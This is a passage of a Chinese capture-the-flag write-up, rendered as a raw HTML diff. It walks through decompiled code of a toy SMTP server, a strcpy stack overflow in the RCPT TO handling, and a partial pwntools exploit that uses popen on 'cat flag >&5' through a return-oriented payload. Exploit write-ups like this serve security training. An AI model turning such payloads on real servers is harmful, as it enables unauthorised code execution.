class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;session %d: recv error\n&quot;</span>, fd);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ptr = (<span class="type">void</span> *)parse_request((<span class="type">char</span> *)s);  <span class="comment">//解析请求</span></span><br><span class="line">      <span class="keyword">if</span> ( v35[<span class="number">1</span>] != <span class="number">4</span> || *(_DWORD *)ptr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v35[<span class="number">1</span>] == <span class="number">4</span> &amp;&amp; *(_DWORD *)ptr == <span class="number">4</span> &amp;&amp; <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)s) &gt; <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( *(_DWORD *)(v35[<span class="number">4</span>] + <span class="number">8</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v7 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)s);</span><br><span class="line">            v24 = v7 + <span class="built_in">strlen</span>(*(<span class="type">const</span> <span class="type">char</span> **)(v35[<span class="number">4</span>] + <span class="number">8</span>)) + <span class="number">1</span>;</span><br><span class="line">            v23 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v24);</span><br><span class="line">            v8 = <span class="built_in">strlen</span>(*(<span class="type">const</span> <span class="type">char</span> **)(v35[<span class="number">4</span>] + <span class="number">8</span>));</span><br><span class="line">            <span class="built_in">strncpy</span>(v23, *(<span class="type">const</span> <span class="type">char</span> **)(v35[<span class="number">4</span>] + <span class="number">8</span>), v8 + <span class="number">1</span>);</span><br><span class="line">            v9 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)s);</span><br><span class="line">            <span class="built_in">strncat</span>(v23, (<span class="type">const</span> <span class="type">char</span> *)s, v9 - <span class="number">5</span>);</span><br><span class="line">            v23[v24] = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">free</span>(*(<span class="type">void</span> **)(v35[<span class="number">4</span>] + <span class="number">8</span>));</span><br><span class="line">            *(_DWORD *)(v35[<span class="number">4</span>] + <span class="number">8</span>) = v23;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v6 = v35[<span class="number">4</span>];</span><br><span class="line">            *(_DWORD *)(v6 + <span class="number">8</span>) = strdup((<span class="type">const</span> <span class="type">char</span> *)s);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( *((_DWORD *)ptr + <span class="number">1</span>) )</span><br><span class="line">            <span class="built_in">free</span>(*((<span class="type">void</span> **)ptr + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> ( *(_DWORD *)ptr )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">0</span>:       <span class="comment">// HELO</span></span><br><span class="line">            session_reset(v35);</span><br><span class="line">            <span class="keyword">if</span> ( !v35[<span class="number">1</span>] )</span><br><span class="line">            &#123;</span><br><span class="line">              v10 = <span class="built_in">strlen</span>(server_replies[<span class="number">0</span>]);</span><br><span class="line">              send(fd, server_replies[<span class="number">0</span>], v10, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            v35[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">            v11 = strdup(*((<span class="type">const</span> <span class="type">char</span> **)ptr + <span class="number">1</span>));</span><br><span class="line">            v35[<span class="number">3</span>] = (<span class="type">int</span>)v11;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;session %d: state changed to greeted\n&quot;</span>, fd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">1</span>:       <span class="comment">// MAIL FROM:</span></span><br><span class="line">            <span class="keyword">if</span> ( v35[<span class="number">1</span>] != <span class="number">1</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_41;</span><br><span class="line">            v35[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">            v12 = (<span class="type">char</span> **)v35[<span class="number">4</span>];</span><br><span class="line">            *v12 = strdup(*((<span class="type">const</span> <span class="type">char</span> **)ptr + <span class="number">1</span>));</span><br><span class="line">            v13 = <span class="built_in">strlen</span>(server_replies[<span class="number">0</span>]);</span><br><span class="line">            send(fd, server_replies[<span class="number">0</span>], v13, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;session %d: got mail from\n&quot;</span>, fd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">2</span>:       <span class="comment">// RCPT TO:</span></span><br><span class="line">            <span class="keyword">if</span> ( v35[<span class="number">1</span>] != <span class="number">2</span> &amp;&amp; v35[<span class="number">1</span>] != <span class="number">3</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_41;</span><br><span class="line">            v35[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">            v14 = v35[<span class="number">4</span>];</span><br><span class="line">            *(_DWORD *)(v14 + <span class="number">4</span>) = strdup(*((<span class="type">const</span> <span class="type">char</span> **)ptr + <span class="number">1</span>));<span class="comment">// 重点</span></span><br><span class="line">            v15 = <span class="built_in">strlen</span>(server_replies[<span class="number">0</span>]);</span><br><span class="line">            send(fd, server_replies[<span class="number">0</span>], v15, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;session %d: state changed to got receipients\n&quot;</span>, fd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">3</span>:       <span class="comment">// DATA</span></span><br><span class="line">            <span class="keyword">if</span> ( v35[<span class="number">1</span>] != <span class="number">3</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_41;</span><br><span class="line">            v35[<span class="number">1</span>] = <span class="number">4</span>;</span><br><span class="line">            v16 = <span class="built_in">strlen</span>(off_804D0A8[<span class="number">0</span>]);</span><br><span class="line">            send(fd, off_804D0A8[<span class="number">0</span>], v16, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;session %d: state changed to data receival\n&quot;</span>, fd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">4</span>:       <span class="comment">// .\r\n</span></span><br><span class="line">            <span class="keyword">if</span> ( v35[<span class="number">1</span>] == <span class="number">4</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              session_submit(v35);</span><br><span class="line">              session_reset(v35);</span><br><span class="line">              v35[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">              v17 = <span class="built_in">strlen</span>(server_replies[<span class="number">0</span>]);</span><br><span class="line">              send(fd, server_replies[<span class="number">0</span>], v17, <span class="number">0</span>);</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;session %d: data transaction over, state changed to greeted\n&quot;</span>, fd);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">LABEL_41:</span><br><span class="line">              v18 = <span class="built_in">strlen</span>(off_804D0B0);</span><br><span class="line">              send(fd, off_804D0B0, v18, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            v35[<span class="number">1</span>] = <span class="number">5</span>;</span><br><span class="line">            v19 = <span class="built_in">strlen</span>(off_804D0AC[<span class="number">0</span>]);</span><br><span class="line">            send(fd, off_804D0AC[<span class="number">0</span>], v19, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;session %d: state changed to quit\n&quot;</span>, fd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            v20 = <span class="built_in">strlen</span>(off_804D0A4[<span class="number">0</span>]);</span><br><span class="line">            send(fd, off_804D0A4[<span class="number">0</span>], v20, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;session %d: syntax error\n&quot;</span>, fd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">       <span class="comment">//...略...</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;session %d: finished\n&quot;</span>, fd);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">// main函数
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+&#123;
+  if ( argc == 2 )
+    listener((char *)argv[1]);
+  listener(&quot;9999&quot;);           //不特定监听端口则默认9999
+&#125;
 
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求解析函数,parse_request</span></span><br><span class="line">_DWORD *__cdecl <span class="title function_">parse_request</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argument_string_start; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  _DWORD *v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">  *v4 = get_session_command(s);</span><br><span class="line">  <span class="keyword">if</span> ( *v4 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ptr = strdup(s);</span><br><span class="line">    argument_string_start = (<span class="type">char</span> *)get_argument_string_start(ptr, *v4);</span><br><span class="line">    <span class="keyword">if</span> ( *argument_string_start )</span><br><span class="line">      v4[<span class="number">1</span>] = strdup(argument_string_start);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> v4;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对应的请求命令</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">get_session_command</span><span class="params">(<span class="type">char</span> *s1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;HELO&quot;</span>, <span class="number">4u</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;MAIL FROM:&quot;</span>, <span class="number">0xA</span>u) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;RCPT TO:&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;DATA&quot;</span>, <span class="number">4u</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;.\r\n&quot;</span>, <span class="number">3u</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(s1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s1[v2 - <span class="number">5</span>], <span class="string">&quot;\r\n.\r\n&quot;</span>, <span class="number">5u</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;QUIT&quot;</span>, <span class="number">4u</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+//listener函数
+void __cdecl __noreturn listener(char *service)
+&#123;
+  // ...略...
+  puts(&quot;listener: waiting for connections...&quot;);  //等待连接（对应已获取的信息）
+  epfd = epoll_create(16);
+  event.data.fd = fd;
+  event.events = 1;
+  epoll_ctl(epfd, 1, fd, &amp;event);
+  events = (struct epoll_event *)calloc(0x10u, 0xCu);
+  while ( 1 )
+  &#123;
+    v12 = epoll_wait(epfd, events, 1, -1);
+    for ( i = 0; i &lt; v12; ++i )
+    &#123;
+      if ( fd == events[i].data.fd )
+      &#123;
+        addr_len = 128;
+        v11 = accept(fd, &amp;addr, &amp;addr_len);
+        v1 = (const void *)get_in_addr(&amp;addr);
+        inet_ntop(addr.sa_family, v1, buf, 0x2Eu);
+        printf(&quot;listener: got connection from %s\n&quot;, buf); //连接
+        arg = malloc(0x14u);
+        *(_DWORD *)arg = v11;
+        *((_DWORD *)arg + 1) = 0;
+        pthread_create(&amp;newthread, 0, (void *(*)(void *))session_worker, arg); //创建线程,去执行session_work函数
+        puts(&quot;listener: initiated a new session worker&quot;);
+      &#125;
+    &#125;
+  &#125;
+&#125;
 
+// session_worker函数
+void *__cdecl session_worker(int *a1)
+&#123;
+  // ...略...
+  v35 = a1;
+  fd = *a1;
+  session_reset(a1);
+  printf(&quot;session %d: starting work, state %d\n&quot;, fd, a1[1]);
+  v1 = strlen(off_804D0A0[0]);
+  send(fd, off_804D0A0[0], v1, 0);
+  // ...略...
+  while ( v35[1] != 5 )
+  &#123;
+    v29 = epoll_wait(epfd, events, 1, timeout);
+    if ( !v29 )
+    &#123;
+      close(fd);
+      printf(&quot;session %d: timeout, work is over\n&quot;, fd);
+      break;
+    &#125;
+    if ( v29 == 1 )
+    &#123;
+      memset(s, 0, 0x400u);
+      v28 = recv(fd, s, nmemb - 1, 0);   //接收到请求，赋给s
+      if ( !v28 )
+      &#123;
+        printf(&quot;session %d: client closed connection\n&quot;, fd);
+        break;
+      &#125;
+      if ( v28 &lt; 0 )
+      &#123;
+        printf(&quot;session %d: recv error\n&quot;, fd);
+        break;
+      &#125;
+      ptr = (void *)parse_request((char *)s);  //解析请求
+      if ( v35[1] != 4 || *(_DWORD *)ptr == 4 )
+      &#123;
+        if ( v35[1] == 4 &amp;&amp; *(_DWORD *)ptr == 4 &amp;&amp; strlen((const char *)s) &gt; 3 )
+        &#123;
+          if ( *(_DWORD *)(v35[4] + 8) )
+          &#123;
+            v7 = strlen((const char *)s);
+            v24 = v7 + strlen(*(const char **)(v35[4] + 8)) + 1;
+            v23 = (char *)malloc(v24);
+            v8 = strlen(*(const char **)(v35[4] + 8));
+            strncpy(v23, *(const char **)(v35[4] + 8), v8 + 1);
+            v9 = strlen((const char *)s);
+            strncat(v23, (const char *)s, v9 - 5);
+            v23[v24] = 0;
+            free(*(void **)(v35[4] + 8));
+            *(_DWORD *)(v35[4] + 8) = v23;
+          &#125;
+          else
+          &#123;
+            v6 = v35[4];
+            *(_DWORD *)(v6 + 8) = strdup((const char *)s);
+          &#125;
+          if ( *((_DWORD *)ptr + 1) )
+            free(*((void **)ptr + 1));
+        &#125;
+        switch ( *(_DWORD *)ptr )
+        &#123;
+          case 0:       // HELO
+            session_reset(v35);
+            if ( !v35[1] )
+            &#123;
+              v10 = strlen(server_replies[0]);
+              send(fd, server_replies[0], v10, 0);
+            &#125;
+            v35[1] = 1;
+            v11 = strdup(*((const char **)ptr + 1));
+            v35[3] = (int)v11;
+            printf(&quot;session %d: state changed to greeted\n&quot;, fd);
+            break;
+          case 1:       // MAIL FROM:
+            if ( v35[1] != 1 )
+              goto LABEL_41;
+            v35[1] = 2;
+            v12 = (char **)v35[4];
+            *v12 = strdup(*((const char **)ptr + 1));
+            v13 = strlen(server_replies[0]);
+            send(fd, server_replies[0], v13, 0);
+            printf(&quot;session %d: got mail from\n&quot;, fd);
+            break;
+          case 2:       // RCPT TO:
+            if ( v35[1] != 2 &amp;&amp; v35[1] != 3 )
+              goto LABEL_41;
+            v35[1] = 3;
+            v14 = v35[4];
+            *(_DWORD *)(v14 + 4) = strdup(*((const char **)ptr + 1));// 重点
+            v15 = strlen(server_replies[0]);
+            send(fd, server_replies[0], v15, 0);
+            printf(&quot;session %d: state changed to got receipients\n&quot;, fd);
+            break;
+          case 3:       // DATA
+            if ( v35[1] != 3 )
+              goto LABEL_41;
+            v35[1] = 4;
+            v16 = strlen(off_804D0A8[0]);
+            send(fd, off_804D0A8[0], v16, 0);
+            printf(&quot;session %d: state changed to data receival\n&quot;, fd);
+            break;
+          case 4:       // .\r\n
+            if ( v35[1] == 4 )
+            &#123;
+              session_submit(v35);
+              session_reset(v35);
+              v35[1] = 1;
+              v17 = strlen(server_replies[0]);
+              send(fd, server_replies[0], v17, 0);
+              printf(&quot;session %d: data transaction over, state changed to greeted\n&quot;, fd);
+            &#125;
+            else
+            &#123;
+LABEL_41:
+              v18 = strlen(off_804D0B0);
+              send(fd, off_804D0B0, v18, 0);
+            &#125;
+            break;
+          case 5:
+            v35[1] = 5;
+            v19 = strlen(off_804D0AC[0]);
+            send(fd, off_804D0AC[0], v19, 0);
+            printf(&quot;session %d: state changed to quit\n&quot;, fd);
+            break;
+          default:
+            v20 = strlen(off_804D0A4[0]);
+            send(fd, off_804D0A4[0], v20, 0);
+            printf(&quot;session %d: syntax error\n&quot;, fd);
+            break;
+        &#125;
+      &#125;
+      else
+      &#123;
+       //...略...
+      &#125;
+      free(ptr);
+    &#125;
+  &#125;
+  free(s);
+  free(a1);
+  printf(&quot;session %d: finished\n&quot;, fd);
+  close(fd);
+  return 0;
+&#125;
+</code></pre>
+<pre><code class="c">// 请求解析函数,parse_request
+_DWORD *__cdecl parse_request(char *s)
+&#123;
+  char *argument_string_start; // [esp+4h] [ebp-14h]
+  char *ptr; // [esp+8h] [ebp-10h]
+  _DWORD *v4; // [esp+Ch] [ebp-Ch]
+
+  v4 = malloc(8u);
+  *v4 = get_session_command(s);
+  if ( *v4 == -1 )
+  &#123;
+    v4[1] = 0;
+    return v4;
+  &#125;
+  else
+  &#123;
+    v4[1] = 0;
+    ptr = strdup(s);
+    argument_string_start = (char *)get_argument_string_start(ptr, *v4);
+    if ( *argument_string_start )
+      v4[1] = strdup(argument_string_start);
+    free(ptr);
+    return v4;
+  &#125;
+&#125;
+
+// 对应的请求命令
+int __cdecl get_session_command(char *s1)
+&#123;
+  size_t v2; // eax
+
+  if ( !strncmp(s1, &quot;HELO&quot;, 4u) )
+    return 0;
+  if ( !strncmp(s1, &quot;MAIL FROM:&quot;, 0xAu) )
+    return 1;
+  if ( !strncmp(s1, &quot;RCPT TO:&quot;, 8u) )
+    return 2;
+  if ( !strncmp(s1, &quot;DATA&quot;, 4u) )
+    return 3;
+  if ( !strncmp(s1, &quot;.\r\n&quot;, 3u) )
+    return 4;
+  v2 = strlen(s1);
+  if ( !strncmp(&amp;s1[v2 - 5], &quot;\r\n.\r\n&quot;, 5u) )
+    return 4;
+  if ( !strncmp(s1, &quot;QUIT&quot;, 4u) )
+    return 5;
+  return -1;
+&#125;
+</code></pre>
 <p>通过对这几个case代码审计，发现漏洞存在case 4的session_submit函数中的sender_worker中。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// session_submit函数</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">session_submit</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> newthread[<span class="number">2</span>]; <span class="comment">// [esp+Ch] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;session %d: received message &#x27;%s&#x27;\n&quot;</span>, *a1, *(<span class="type">const</span> <span class="type">char</span> **)(a1[<span class="number">4</span>] + <span class="number">8</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;session %d: handing off message to sender\n&quot;</span>, *a1);</span><br><span class="line">  <span class="keyword">return</span> pthread_create(newthread, <span class="number">0</span>, sender_worker, (<span class="type">void</span> *)a1[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sender_worker函数</span></span><br><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">sender_worker</span><span class="params">(<span class="type">const</span> <span class="type">char</span> **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// [esp+Ch] [ebp-10Ch] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v3; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;sender: starting work&quot;</span>);</span><br><span class="line">  v3 = a1;</span><br><span class="line">  len = <span class="built_in">strlen</span>(a1[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;sender: sending message....&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;sender: FROM: %s\n&quot;</span>, *a1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(*a1) &lt;= <span class="number">79</span> )</span><br><span class="line">    <span class="built_in">strcpy</span>(from, *v3);     <span class="comment">//from:0x0804d140</span></span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">0xFF</span>u )   </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sender: TO: %s\n&quot;</span>, v3[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">strcpy</span>(s, v3[<span class="number">1</span>]);      <span class="comment">//直接拷贝,存在溢出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sender: TO: %s\n&quot;</span>, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;sender: BODY:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3[<span class="number">2</span>] )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v3[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No body.&quot;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;sender: finished&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">// session_submit函数
+int __cdecl session_submit(_DWORD *a1)
+&#123;
+  pthread_t newthread[2]; // [esp+Ch] [ebp-Ch] BYREF
 
+  printf(&quot;session %d: received message &#39;%s&#39;\n&quot;, *a1, *(const char **)(a1[4] + 8));
+  printf(&quot;session %d: handing off message to sender\n&quot;, *a1);
+  return pthread_create(newthread, 0, sender_worker, (void *)a1[4]);
+&#125;
+
+// sender_worker函数
+void *__cdecl sender_worker(const char **a1)
+&#123;
+  char s[256]; // [esp+Ch] [ebp-10Ch] BYREF
+  const char **v3; // [esp+10Ch] [ebp-Ch]
+
+  puts(&quot;sender: starting work&quot;);
+  v3 = a1;
+  len = strlen(a1[1]);
+  puts(&quot;sender: sending message....&quot;);
+  printf(&quot;sender: FROM: %s\n&quot;, *a1);
+  if ( strlen(*a1) &lt;= 79 )
+    strcpy(from, *v3);     //from:0x0804d140
+  if ( len &lt;= 0xFFu )   
+  &#123;
+    printf(&quot;sender: TO: %s\n&quot;, v3[1]);
+  &#125;
+  else
+  &#123;
+    memset(s, 0, sizeof(s));
+    strcpy(s, v3[1]);      //直接拷贝,存在溢出
+    printf(&quot;sender: TO: %s\n&quot;, s);
+  &#125;
+  puts(&quot;sender: BODY:&quot;);
+  if ( v3[2] )
+    printf(&quot;%s&quot;, v3[2]);
+  else
+    puts(&quot;No body.&quot;);
+  putchar(10);
+  puts(&quot;sender: finished&quot;);
+  return 0;
+&#125;
+</code></pre>
 <p>现在知道了在sender_worker中，v3[1]会导致栈溢出。我们还需要知道v3[1]对应的是哪个命令的数据，我们可以逐函数反推。反推可得v3[1]是”RCPT TO:”后面接着的数据，但其需要最后处理.\r\n时才能触发。</p>
 <p>popen函数可以执行任意可执行命令，我们可以在MAIL FROM:后添加数据，向bss段写入”cat flag &gt;&amp;5”，然后使用popen(“cat flag &gt;&amp;5”, “r”)读取flag。&gt;&amp;5是需要重定向，具体的值需要一个个试。</p>
 <p>理论上：payload = b’a’ * 0x110 + p32(elf.plt[‘popen’]) + p32(0xdeadbeef) + p32(bss) + p32(read)</p>
 <p>但执行过程发现crash了，调试发现，程序断在了这里：</p>
 <p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic03.png" alt="pic03"></p>
 <p>原因是上一步把’aaaa’传给了eax，导致下个指令对一个无效地址进行访问，导致了SIGSEGV。所以我们需要在[ebp - 0xc]处给个有效地址。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;220 SMTP tsmtp&#x27;</span>, <span class="string">b&#x27;HELO&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;250 Ok&#x27;</span>, <span class="string">b&#x27;MAIL FROM:&#x27;</span> + <span class="string">b&#x27;cat flag &gt;&amp;5&#x27;</span>)   <span class="comment"># shellcode</span></span><br><span class="line">read = elf.search(<span class="string">b&#x27;r\x00&#x27;</span>).__next__()</span><br><span class="line">bss = <span 